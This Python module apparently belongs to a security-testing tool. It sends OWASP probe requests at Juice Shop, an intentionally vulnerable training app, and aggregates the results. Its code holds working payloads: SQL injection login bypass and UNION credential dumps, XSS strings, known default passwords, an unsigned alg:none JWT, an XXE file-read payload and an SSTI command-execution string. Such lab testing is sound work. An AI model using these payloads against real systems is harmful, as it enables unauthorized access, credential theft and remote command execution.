# FILE: backend/services/juice_shop_probes.py
# PURPOSE: Juice Shop-aware probe sequences for each OWASP vuln type.
#          Each probe tries multiple scenarios and aggregates results.
# SECURITY NOTE: All probes are passive/educational — no destructive payloads executed

import json
import logging
import re
from typing import Any

import httpx

logger = logging.getLogger(__name__)

# ── Severity ranking ──────────────────────────────────────────────────────────
_SEV_RANK = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}


# ── Scenario result builder ───────────────────────────────────────────────────

def _scenario(
    name: str,
    confirmed: bool,
    severity: str | None,
    evidence: str,
    method: str,
    path: str,
    body: dict | None = None,
    response_snippet: str = "",
    reproduce_step: str = "",
) -> dict:
    return {
        "name": name,
        "confirmed": confirmed,
        "severity": severity if confirmed else None,
        "evidence": evidence,
        "request": {"method": method, "url": path, "body": body},
        "response_snippet": response_snippet[:500],
        "reproduce_step": reproduce_step or f"{method} {path}",
    }


# ── HTTP helpers ──────────────────────────────────────────────────────────────

async def _get(client: httpx.AsyncClient, url: str, headers: dict | None = None,
               timeout: int = 8) -> httpx.Response | None:
    try:
        return await client.get(url, headers=headers or {}, timeout=timeout,
                                follow_redirects=True)
    except httpx.RequestError:
        return None


async def _post(client: httpx.AsyncClient, url: str, body: dict,
                headers: dict | None = None, timeout: int = 8) -> httpx.Response | None:
    try:
        return await client.post(url, json=body, headers=headers or {},
                                 timeout=timeout, follow_redirects=True)
    except httpx.RequestError:
        return None


async def _check_endpoints(client: httpx.AsyncClient, base_url: str,
                            paths: list[str]) -> list[tuple[str, int, str]]:
    """Returns (path, status_code, body_snippet) for each accessible path."""
    hits = []
    for path in paths:
        r = await _get(client, base_url.rstrip("/") + path, timeout=6)
        if r and r.status_code < 400:
            hits.append((path, r.status_code, r.text[:300]))
    return hits


def _has_token(resp: httpx.Response) -> bool:
    """Check if response contains an authentication token."""
    try:
        body = resp.json()
        text = json.dumps(body).lower()
        return "token" in text or "authentication" in text or "bearer" in text
    except Exception:
        return "token" in resp.text.lower()


def _has_sql_error(text: str) -> bool:
    patterns = ["sql syntax", "sqlite_error", "ora-", "pg::", "unterminated",
                "sqlite3", "you have an error in your sql", "syntax error"]
    t = text.lower()
    return any(p in t for p in patterns)


# ── Per-vuln probe sequences ──────────────────────────────────────────────────

async def _scenarios_sql_injection(
    client: httpx.AsyncClient, base_url: str, _auth_info: dict | None
) -> list[dict]:
    results = []
    b = base_url.rstrip("/")

    # Scenario 1 — Login bypass
    r = await _post(client, f"{b}/api/Users/login",
                    {"email": "' OR 1=1--", "password": "x"})
    confirmed = bool(r and r.status_code == 200 and _has_token(r))
    results.append(_scenario(
        name="Login bypass via SQL injection",
        confirmed=confirmed, severity="critical",
        evidence=f"POST /api/Users/login → HTTP {r.status_code if r else 'N/A'}; token={'yes' if confirmed else 'no'}",
        method="POST", path="/api/Users/login",
        body={"email": "' OR 1=1--", "password": "x"},
        response_snippet=r.text if r else "",
        reproduce_step="POST /api/Users/login with body {\"email\":\"' OR 1=1--\",\"password\":\"x\"}",
    ))

    # Scenario 2 — Search SQLi (error-based)
    for payload in ["))'--", "))%3B--"]:
        r2 = await _get(client, f"{b}/rest/products/search?q={payload}")
        if r2 and _has_sql_error(r2.text):
            results.append(_scenario(
                name=f"Search endpoint SQL error ({payload})",
                confirmed=True, severity="high",
                evidence=f"GET /rest/products/search?q={payload} → SQL error in response",
                method="GET", path=f"/rest/products/search?q={payload}",
                response_snippet=r2.text,
                reproduce_step=f"GET /rest/products/search?q={payload}",
            ))
        else:
            results.append(_scenario(
                name=f"Search endpoint SQL error ({payload})",
                confirmed=False, severity=None,
                evidence=f"HTTP {r2.status_code if r2 else 'N/A'} — no SQL error detected",
                method="GET", path=f"/rest/products/search?q={payload}",
                response_snippet=r2.text[:300] if r2 else "",
            ))

    # Scenario 3 — Christmas special (UNION)
    r3 = await _get(client, f"{b}/rest/products/search?q='))UNION SELECT * FROM Users--")
    confirmed3 = bool(r3 and r3.status_code == 200 and
                      ("email" in r3.text.lower() or "password" in r3.text.lower()))
    results.append(_scenario(
        name="UNION-based user data extraction via search",
        confirmed=confirmed3, severity="critical",
        evidence=f"GET /rest/products/search?q=UNION... → HTTP {r3.status_code if r3 else 'N/A'}; user_data={'yes' if confirmed3 else 'no'}",
        method="GET", path="/rest/products/search?q='))UNION SELECT * FROM Users--",
        response_snippet=r3.text if r3 else "",
        reproduce_step="GET /rest/products/search?q='))UNION SELECT * FROM Users--",
    ))

    # Scenario 4 — Credential dump (URL-encoded UNION)
    dump_payload = ("/rest/products/search?q='))UNION%20SELECT%20id%2C%20email%2C"
                    "%20password%2C%20'4'%2C%20'5'%2C%20'6'%2C%20'7'%2C%20'8'%2C%20'9'%20FROM%20Users--")
    r4 = await _get(client, f"{b}{dump_payload}")
    has_creds = bool(r4 and r4.status_code == 200 and
                     "@" in r4.text and ("hash" in r4.text.lower() or "password" in r4.text.lower()))
    results.append(_scenario(
        name="User credentials dump via UNION injection",
        confirmed=has_creds, severity="critical",
        evidence=f"UNION credential dump → HTTP {r4.status_code if r4 else 'N/A'}; credentials={'leaked' if has_creds else 'not found'}",
        method="GET", path=dump_payload,
        response_snippet=r4.text if r4 else "",
        reproduce_step=f"GET {b}{dump_payload}",
    ))

    return results


async def _scenarios_xss(
    client: httpx.AsyncClient, base_url: str, _auth_info: dict | None
) -> list[dict]:
    results = []
    b = base_url.rstrip("/")

    # Scenario 1 — Reflected XSS in search API
    xss_payload = "<script>alert(1)</script>"
    r = await _get(client, f"{b}/rest/products/search?q={xss_payload}")
    reflected = bool(r and xss_payload in r.text and
                     not _esc_check(r.text, xss_payload))
    results.append(_scenario(
        name="Reflected XSS in search endpoint",
        confirmed=reflected, severity="high",
        evidence=f"Payload reflected: {'yes (unescaped)' if reflected else 'no/escaped'}",
        method="GET", path=f"/rest/products/search?q={xss_payload}",
        response_snippet=r.text if r else "",
        reproduce_step=f"GET /rest/products/search?q={xss_payload}",
    ))

    # Scenario 2 — CSP header check
    r2 = await _get(client, f"{b}/")
    csp = (r2.headers.get("content-security-policy", "") if r2 else "")
    csp_weak = not csp or "unsafe-inline" in csp or "unsafe-eval" in csp
    results.append(_scenario(
        name="Missing or weak Content-Security-Policy",
        confirmed=csp_weak, severity="medium",
        evidence=f"CSP: {csp[:100] if csp else 'not set'}",
        method="GET", path="/",
        response_snippet=f"CSP header: {csp[:200] if csp else 'absent'}",
        reproduce_step="GET / — inspect Content-Security-Policy response header",
    ))

    # Scenario 3 — XSS via HTTP header reflection
    xss_header = "<script>alert(1)</script>"
    r3 = await _get(client, f"{b}/api/Feedbacks/",
                    headers={"X-Forwarded-For": xss_header})
    header_reflected = bool(r3 and xss_header in r3.text)
    results.append(_scenario(
        name="XSS via reflected X-Forwarded-For header",
        confirmed=header_reflected, severity="high",
        evidence=f"X-Forwarded-For header reflected: {'yes' if header_reflected else 'no'}",
        method="GET", path="/api/Feedbacks/",
        response_snippet=r3.text[:300] if r3 else "",
        reproduce_step="GET /api/Feedbacks/ with X-Forwarded-For: <script>alert(1)</script>",
    ))

    # Scenario 4 — DOM XSS indicator (X-XSS-Protection absent)
    xss_prot = (r2.headers.get("x-xss-protection", "") if r2 else "")
    results.append(_scenario(
        name="X-XSS-Protection header absent",
        confirmed=not xss_prot, severity="low",
        evidence=f"X-XSS-Protection: {xss_prot if xss_prot else 'not set'}",
        method="GET", path="/",
        reproduce_step="GET / — inspect X-XSS-Protection header",
    ))

    # Scenario 5 — Juice Shop Bonus: soundcloud iframe XSS payload
    bonus_q = ("<iframe width=\"100%\" height=\"166\" scrolling=\"no\" "
               "frameborder=\"no\" allow=\"autoplay\" "
               "src=\"https://w.soundcloud.com/player/\">")
    r5 = await _get(client, f"{b}/rest/products/search?q={bonus_q}")
    bonus = bool(r5 and "iframe" in r5.text.lower() and r5.status_code == 200)
    results.append(_scenario(
        name="Bonus XSS: iframe embed payload in search",
        confirmed=bonus, severity="medium",
        evidence=f"iframe payload accepted: {'yes' if bonus else 'no'} (HTTP {r5.status_code if r5 else 'N/A'})",
        method="GET", path="/rest/products/search?q=<iframe...>",
        response_snippet=r5.text[:300] if r5 else "",
        reproduce_step="GET /rest/products/search?q=<iframe ...> (Juice Shop bonus challenge)",
    ))

    return results


def _esc_check(html_text: str, payload: str) -> bool:
    """Returns True if the payload appears HTML-escaped in the response."""
    escaped = payload.replace("<", "&lt;").replace(">", "&gt;")
    return escaped in html_text


async def _scenarios_broken_auth(
    client: httpx.AsyncClient, base_url: str, _auth_info: dict | None
) -> list[dict]:
    results = []
    b = base_url.rstrip("/")
    login_path = "/api/Users/login"

    # Scenario 1 — Default admin credentials
    r = await _post(client, f"{b}{login_path}",
                    {"email": "admin@juice-sh.op", "password": "admin123"})
    confirmed = bool(r and r.status_code == 200 and _has_token(r))
    results.append(_scenario(
        name="Default admin credentials accepted",
        confirmed=confirmed, severity="critical",
        evidence=f"POST /api/Users/login admin@juice-sh.op:admin123 → HTTP {r.status_code if r else 'N/A'}",
        method="POST", path=login_path,
        body={"email": "admin@juice-sh.op", "password": "admin123"},
        response_snippet=r.text if r else "",
        reproduce_step="POST /api/Users/login {\"email\":\"admin@juice-sh.op\",\"password\":\"admin123\"}",
    ))

    # Scenario 2 — Weak password (Jim)
    r2 = await _post(client, f"{b}{login_path}",
                     {"email": "jim@juice-sh.op", "password": "ncc-1701"})
    confirmed2 = bool(r2 and r2.status_code == 200 and _has_token(r2))
    results.append(_scenario(
        name="Weak password accepted (jim@juice-sh.op / ncc-1701)",
        confirmed=confirmed2, severity="high",
        evidence=f"HTTP {r2.status_code if r2 else 'N/A'}; token={'yes' if confirmed2 else 'no'}",
        method="POST", path=login_path,
        body={"email": "jim@juice-sh.op", "password": "ncc-1701"},
        response_snippet=r2.text if r2 else "",
    ))

    # Scenario 3 — Weak password (Bender)
    r3 = await _post(client, f"{b}{login_path}",
                     {"email": "bender@juice-sh.op", "password": "OhI*bender"})
    confirmed3 = bool(r3 and r3.status_code == 200 and _has_token(r3))
    results.append(_scenario(
        name="Weak password accepted (bender@juice-sh.op)",
        confirmed=confirmed3, severity="high",
        evidence=f"HTTP {r3.status_code if r3 else 'N/A'}; token={'yes' if confirmed3 else 'no'}",
        method="POST", path=login_path,
        body={"email": "bender@juice-sh.op", "password": "OhI*bender"},
        response_snippet=r3.text if r3 else "",
    ))

    # Scenario 4 — JWT alg:none
    alg_none_token = "eyJhbGciOiJub25lIn0.eyJkYXRhIjp7ImlkIjoxfX0."
    r4 = await _get(client, f"{b}/rest/user/whoami",
                    headers={"Authorization": f"Bearer {alg_none_token}"})
    alg_none = bool(r4 and r4.status_code == 200 and
                    ("email" in r4.text.lower() or "\"id\"" in r4.text))
    results.append(_scenario(
        name="JWT algorithm:none accepted (unsigned token)",
        confirmed=alg_none, severity="critical",
        evidence=f"alg:none JWT → HTTP {r4.status_code if r4 else 'N/A'}; user_data={'yes' if alg_none else 'no'}",
        method="GET", path="/rest/user/whoami",
        response_snippet=r4.text if r4 else "",
        reproduce_step="GET /rest/user/whoami with Authorization: Bearer eyJhbGciOiJub25lIn0.eyJkYXRhIjp7ImlkIjoxfX0.",
    ))

    # Scenario 5 — Rate limiting check (10 rapid requests)
    blocked = False
    for _ in range(10):
        rr = await _post(client, f"{b}{login_path}",
                         {"email": "ratelimit_probe@notreal.com", "password": "wrong_xyz_9"})
        if rr and rr.status_code == 429:
            blocked = True
            break
    results.append(_scenario(
        name="No rate limiting on login endpoint",
        confirmed=not blocked, severity="medium",
        evidence="10 rapid failed logins: " + ("rate limited ✓" if blocked else "no lockout or 429 detected"),
        method="POST", path=login_path,
        body={"email": "test@test.com", "password": "wrong"},
        reproduce_step="Send 10+ POST /api/Users/login with wrong credentials — observe no 429",
    ))

    return results


async def _scenarios_broken_access_control(
    client: httpx.AsyncClient, base_url: str, _auth_info: dict | None
) -> list[dict]:
    """Maps to insecure_design vuln type."""
    results = []
    b = base_url.rstrip("/")

    # Scenario 1 — Admin panel exposed
    admin_paths = ["/administration", "/#/administration", "/api/Users/"]
    hits = await _check_endpoints(client, b, admin_paths)
    for path, status, snippet in hits:
        results.append(_scenario(
            name=f"Admin panel accessible without auth: {path}",
            confirmed=True, severity="critical",
            evidence=f"GET {path} → HTTP {status} without authentication",
            method="GET", path=path,
            response_snippet=snippet,
            reproduce_step=f"GET {b}{path} — no Authorization header needed",
        ))
    if not hits:
        results.append(_scenario(
            name="Admin panel exposure check",
            confirmed=False, severity=None,
            evidence="Admin paths returned 401/403 or 404",
            method="GET", path="/administration",
        ))

    # Scenario 2 — View other user basket (BOLA)
    r2 = await _get(client, f"{b}/api/Baskets/1")
    r3 = await _get(client, f"{b}/api/Baskets/2")
    bola = bool((r2 and r2.status_code == 200 and len(r2.text) > 20) or
                (r3 and r3.status_code == 200 and len(r3.text) > 20))
    results.append(_scenario(
        name="BOLA — access other user's basket without auth",
        confirmed=bola, severity="high",
        evidence=f"GET /api/Baskets/1 → {r2.status_code if r2 else 'N/A'} | /api/Baskets/2 → {r3.status_code if r3 else 'N/A'}",
        method="GET", path="/api/Baskets/1",
        response_snippet=(r2.text if r2 else "") + " | " + (r3.text[:100] if r3 else ""),
        reproduce_step="GET /api/Baskets/1 with no Authorization header",
    ))

    # Scenario 3 — Zero-star feedback (business logic flaw)
    r4 = await _post(client, f"{b}/api/Feedbacks/",
                     {"rating": 0, "comment": "probe_test_0star"})
    zero_star = bool(r4 and r4.status_code == 201)
    results.append(_scenario(
        name="Zero-star feedback accepted (business logic bypass)",
        confirmed=zero_star, severity="medium",
        evidence=f"POST /api/Feedbacks/ rating=0 → HTTP {r4.status_code if r4 else 'N/A'}",
        method="POST", path="/api/Feedbacks/",
        body={"rating": 0, "comment": "test"},
        response_snippet=r4.text if r4 else "",
        reproduce_step="POST /api/Feedbacks/ {\"rating\":0,\"comment\":\"test\"}",
    ))

    # Scenario 4 — Score board (security through obscurity)
    sb_paths = ["/#/score-board", "/api/Challenges/?sort=difficulty"]
    sb_hits = await _check_endpoints(client, b, sb_paths)
    results.append(_scenario(
        name="Score board / challenge list accessible",
        confirmed=bool(sb_hits), severity="low",
        evidence=f"Accessible paths: {[h[0] for h in sb_hits] if sb_hits else 'none found'}",
        method="GET", path="/#/score-board",
        reproduce_step="GET /#/score-board — hidden page accessible",
    ))

    return results


async def _scenarios_sensitive_data(
    client: httpx.AsyncClient, base_url: str, _auth_info: dict | None
) -> list[dict]:
    """Maps to sensitive_data_exposure vuln type."""
    results = []
    b = base_url.rstrip("/")

    # Scenario 1 — FTP directory / backup files
    ftp_paths = ["/ftp", "/ftp/package.json.bak", "/ftp/eastere.gg",
                 "/ftp/coupons_2013.md.bak", "/ftp/www-data.bak",
                 "/ftp/acquisitions.md", "/ftp/announcement_encrypted.md"]
    hits = await _check_endpoints(client, b, ftp_paths)
    if hits:
        results.append(_scenario(
            name=f"Sensitive backup/FTP files accessible ({len(hits)} found)",
            confirmed=True, severity="critical",
            evidence=f"Accessible: {[h[0] for h in hits]}",
            method="GET", path=hits[0][0],
            response_snippet=hits[0][2],
            reproduce_step=f"GET {b}{hits[0][0]}",
        ))
    else:
        results.append(_scenario(
            name="Sensitive FTP/backup files check",
            confirmed=False, severity=None,
            evidence="No FTP/backup paths returned 200",
            method="GET", path="/ftp",
        ))

    # Scenario 2 — Exposed user credentials in /api/Users/
    r = await _get(client, f"{b}/api/Users/")
    has_hashes = bool(r and r.status_code == 200 and
                      ("password" in r.text.lower() or "hash" in r.text.lower()) and
                      "@" in r.text)
    results.append(_scenario(
        name="User credentials (email + password hashes) exposed in API",
        confirmed=has_hashes, severity="critical",
        evidence=f"GET /api/Users/ → HTTP {r.status_code if r else 'N/A'}; credentials={'visible' if has_hashes else 'not found'}",
        method="GET", path="/api/Users/",
        response_snippet=r.text[:400] if r else "",
        reproduce_step="GET /api/Users/ — no auth required, returns all user data",
    ))

    # Scenario 3 — API keys / secrets in main.js bundle
    r3 = await _get(client, f"{b}/main.js", timeout=10)
    secret_patterns = ["apiKey", "api_key", "Bearer ", "secret", "privateKey", "CLIENT_SECRET"]
    found_secrets = [p for p in secret_patterns
                     if r3 and p in r3.text] if r3 else []
    results.append(_scenario(
        name=f"Potential secrets in JavaScript bundle ({len(found_secrets)} patterns found)",
        confirmed=bool(found_secrets), severity="high",
        evidence=f"Patterns found: {found_secrets}" if found_secrets else "No secret patterns found in main.js",
        method="GET", path="/main.js",
        reproduce_step="GET /main.js — search for apiKey, Bearer, secret patterns",
    ))

    return results


async def _scenarios_security_misconfig(
    client: httpx.AsyncClient, base_url: str, _auth_info: dict | None
) -> list[dict]:
    """Additional Juice Shop-specific misconfig checks."""
    results = []
    b = base_url.rstrip("/")

    # Scenario 1 — Stack trace from undefined route
    for path in ["/api/Users/doesnotexist", "/rest/undefined"]:
        r = await _get(client, f"{b}{path}")
        stack = bool(r and any(ind in r.text.lower()
                               for ind in ["traceback", "stack trace", "at line", "error:", "exception"]))
        if stack:
            results.append(_scenario(
                name=f"Stack trace leaked from {path}",
                confirmed=True, severity="high",
                evidence=f"GET {path} → HTTP {r.status_code}; stack trace in response",
                method="GET", path=path,
                response_snippet=r.text[:400],
                reproduce_step=f"GET {b}{path}",
            ))

    # Scenario 2 — Deprecated API versions
    old_paths = ["/v1", "/v1/users", "/api/v1/", "/v2/"]
    hits = await _check_endpoints(client, b, old_paths)
    if hits:
        results.append(_scenario(
            name=f"Old/deprecated API version accessible: {hits[0][0]}",
            confirmed=True, severity="medium",
            evidence=f"HTTP {hits[0][1]} → {hits[0][0]}",
            method="GET", path=hits[0][0],
            response_snippet=hits[0][2],
            reproduce_step=f"GET {b}{hits[0][0]}",
        ))

    # Scenario 3 — Exposed metrics / actuator endpoints
    metric_paths = ["/metrics", "/actuator/metrics", "/actuator/health",
                    "/actuator", "/swagger-ui", "/api-docs"]
    hits2 = await _check_endpoints(client, b, metric_paths)
    if hits2:
        results.append(_scenario(
            name=f"Monitoring/docs endpoint exposed: {hits2[0][0]}",
            confirmed=True, severity="medium",
            evidence=f"HTTP {hits2[0][1]} → {hits2[0][0]}",
            method="GET", path=hits2[0][0],
            response_snippet=hits2[0][2],
            reproduce_step=f"GET {b}{hits2[0][0]}",
        ))

    # Scenario 4 — Security headers audit
    r4 = await _get(client, f"{b}/")
    if r4:
        missing_hdrs = [h for h in [
            "content-security-policy", "strict-transport-security",
            "x-frame-options", "x-content-type-options",
            "referrer-policy", "permissions-policy",
        ] if h not in {k.lower(): v for k, v in r4.headers.items()}]
        if missing_hdrs:
            results.append(_scenario(
                name=f"Missing security headers ({len(missing_hdrs)} absent)",
                confirmed=True, severity="medium",
                evidence=f"Missing: {missing_hdrs}",
                method="GET", path="/",
                reproduce_step="GET / — inspect security response headers",
            ))

    return results


async def _scenarios_vulnerable_components(
    client: httpx.AsyncClient, base_url: str, _auth_info: dict | None
) -> list[dict]:
    """Maps to supply_chain vuln type."""
    results = []
    b = base_url.rstrip("/")

    # Scenario 1 — package.json / lock file exposed
    pkg_paths = ["/package.json", "/package-lock.json", "/node_modules/.package-lock.json"]
    hits = await _check_endpoints(client, b, pkg_paths)
    if hits:
        results.append(_scenario(
            name=f"Package manifest exposed: {hits[0][0]}",
            confirmed=True, severity="medium",
            evidence=f"GET {hits[0][0]} → HTTP {hits[0][1]}",
            method="GET", path=hits[0][0],
            response_snippet=hits[0][2],
            reproduce_step=f"GET {b}{hits[0][0]}",
        ))

    # Scenario 2 — Weak JWT secret detection
    r2 = await _get(client, f"{b}/rest/user/whoami")
    if r2:
        jwt_matches = re.findall(
            r'eyJ[A-Za-z0-9+/=]+\.eyJ[A-Za-z0-9+/=]+\.[A-Za-z0-9+/=]*',
            r2.text,
        )
        if jwt_matches:
            import base64
            try:
                header = base64.b64decode(jwt_matches[0].split(".")[0] + "==").decode()
                alg = __import__("json").loads(header).get("alg", "")
                results.append(_scenario(
                    name=f"JWT algorithm in use: {alg}",
                    confirmed=alg.lower() in ("hs256", "hs512"),
                    severity="medium",
                    evidence=f"JWT header: {header[:80]}; alg={alg}",
                    method="GET", path="/rest/user/whoami",
                    response_snippet=r2.text[:200],
                    reproduce_step="GET /rest/user/whoami — decode JWT header to inspect algorithm",
                ))
            except Exception:
                pass

    # Scenario 3 — External scripts without SRI
    r3 = await _get(client, f"{b}/")
    if r3:
        scripts = re.findall(r'<script[^>]+src=["\']([^"\']+)["\'][^>]*>', r3.text, re.I)
        no_sri = [s for s in scripts if s.startswith("http") and "integrity=" not in
                  r3.text[max(0, r3.text.find(s) - 10):r3.text.find(s) + 150]]
        if no_sri:
            results.append(_scenario(
                name=f"External scripts loaded without SRI ({len(no_sri)} found)",
                confirmed=True, severity="medium",
                evidence=f"Scripts without integrity=: {no_sri[:2]}",
                method="GET", path="/",
                reproduce_step="GET / — inspect <script src=...> tags for missing integrity= attribute",
            ))

    return results


async def _scenarios_exceptional(
    client: httpx.AsyncClient, base_url: str, _auth_info: dict | None
) -> list[dict]:
    """Additional probes for exceptional_conditions — includes XXE + deserialization hints."""
    results = []
    b = base_url.rstrip("/")

    # Scenario 1 — File upload endpoint for XXE
    upload_paths = ["/api/FileUpload", "/file-upload", "/upload"]
    hits = await _check_endpoints(client, b, upload_paths)
    results.append(_scenario(
        name="File upload endpoint detected (potential XXE surface)",
        confirmed=bool(hits), severity="high" if hits else None,
        evidence=f"Upload paths accessible: {[h[0] for h in hits]}" if hits else "No upload endpoint found",
        method="GET", path="/api/FileUpload",
        reproduce_step="POST XML file to upload endpoint with XXE payload: <?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
    ))

    # Scenario 2 — SSRF endpoint check
    r2 = await _get(client, f"{b}/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3")
    ssrf = bool(r2 and r2.status_code == 200)
    results.append(_scenario(
        name="SSRF challenge endpoint accessible",
        confirmed=ssrf, severity="high",
        evidence=f"GET /solve/challenges/server-side → HTTP {r2.status_code if r2 else 'N/A'}",
        method="GET", path="/solve/challenges/server-side",
        response_snippet=r2.text[:200] if r2 else "",
        reproduce_step="GET /solve/challenges/server-side — SSRF-triggerable endpoint",
    ))

    # Scenario 3 — Template injection hint (profile image)
    ssti_payload = "#{global.process.mainModule.require('child_process').exec('id')}"
    r3 = await _get(client, f"{b}/profile")
    profile_exists = bool(r3 and r3.status_code in (200, 401, 403))
    results.append(_scenario(
        name="Server-Side Template Injection surface (profile image URL)",
        confirmed=False, severity=None,  # passive hint only
        evidence=f"Profile page: HTTP {r3.status_code if r3 else 'N/A'} — manual SSTI test required",
        method="PUT", path="/rest/user/whoami",
        body={"profileImage": ssti_payload},
        reproduce_step=f"PUT /rest/user/whoami {{\"profileImage\":\"{ssti_payload}\"}} — observe if error reveals template engine",
    ))

    return results


# ── Dispatcher ────────────────────────────────────────────────────────────────

_PROBE_MAP = {
    "sql_injection":           _scenarios_sql_injection,
    "xss":                     _scenarios_xss,
    "broken_auth":             _scenarios_broken_auth,
    "insecure_design":         _scenarios_broken_access_control,  # covers broken access control
    "sensitive_data_exposure": _scenarios_sensitive_data,
    "security_misconfig":      _scenarios_security_misconfig,
    "supply_chain":            _scenarios_vulnerable_components,
    "exceptional_conditions":  _scenarios_exceptional,            # includes XXE / deserialization
}


async def run_juice_shop_scenarios(
    client: httpx.AsyncClient,
    target_url: str,
    vuln_type: str,
    auth_info: dict | None,
) -> list[dict]:
    """Run all Juice Shop-aware probe scenarios for the given vuln type. Never raises."""
    fn = _PROBE_MAP.get(vuln_type)
    if not fn:
        return []
    try:
        return await fn(client, target_url.rstrip("/"), auth_info)
    except Exception as exc:
        logger.warning("[JuiceShopProbes] %s failed: %s", vuln_type, exc)
        return []


# ── Aggregation ───────────────────────────────────────────────────────────────

def aggregate_results(scenarios: list[dict]) -> dict:
    """Aggregate multiple scenario results into a single probe-compatible result dict."""
    confirmed = [s for s in scenarios if s.get("confirmed")]

    if not confirmed:
        return {
            "status": "passed",
            "severity": None,
            "findings": {
                "summary": f"Tested {len(scenarios)} scenarios — no vulnerabilities confirmed",
                "detail": f"Scenarios tested: {[s['name'] for s in scenarios]}",
                "scenario_results":    scenarios,
                "confirmed_scenarios": [],
            },
        }

    sev_rank = ["critical", "high", "medium", "low", "info"]
    highest = min(confirmed, key=lambda s: sev_rank.index(s.get("severity") or "info"))

    detail_lines = [
        f"[{s['severity'].upper()}] {s['name']}: {s['evidence']}"
        for s in confirmed
    ]

    return {
        "status": "success",
        "severity": highest["severity"],
        "findings": {
            "summary": f"{len(confirmed)}/{len(scenarios)} scenarios confirmed vulnerable",
            "detail": "\n".join(detail_lines),
            "scenario_results":    scenarios,
            "confirmed_scenarios": confirmed,
        },
    }


def merge_probe_with_scenarios(
    existing_probe: dict,
    scenarios: list[dict],
) -> dict:
    """
    Merge Juice Shop scenario results with the generic probe result.
    - If scenarios find something more severe → upgrade status/severity.
    - Always add scenario_results + confirmed_scenarios to findings.
    - Never downgrade an existing finding.
    """
    if not scenarios:
        return existing_probe

    js_agg = aggregate_results(scenarios)
    sev_rank = ["critical", "high", "medium", "low", "info"]

    existing_sev = existing_probe.get("severity")
    js_sev       = js_agg.get("severity")

    # Pick the higher severity
    def _rank(s: str | None) -> int:
        return sev_rank.index(s) if s in sev_rank else 99

    if js_agg["status"] == "success" and _rank(js_sev) < _rank(existing_sev):
        # Juice Shop found something worse — upgrade the existing result
        merged_status   = "success"
        merged_severity = js_sev
        merged_summary  = js_agg["findings"]["summary"]
        merged_detail   = (
            (existing_probe.get("detail") or "") + "\n\n" +
            js_agg["findings"].get("detail", "")
        ).strip()
    else:
        # Keep existing result — just enrich with scenario metadata
        merged_status   = existing_probe.get("status", "passed")
        merged_severity = existing_sev
        merged_summary  = existing_probe.get("summary", "")
        merged_detail   = existing_probe.get("detail", "")

    existing_findings = dict(existing_probe.get("findings") or {})
    existing_findings.update({
        "summary":             merged_summary,
        "detail":              merged_detail,
        "scenario_results":    scenarios,
        "confirmed_scenarios": js_agg["findings"].get("confirmed_scenarios", []),
        "tested_scenarios":    len(scenarios),
    })

    return {
        **existing_probe,
        "status":   merged_status,
        "severity": merged_severity,
        "summary":  merged_summary,
        "detail":   merged_detail,
        "findings": existing_findings,
    }
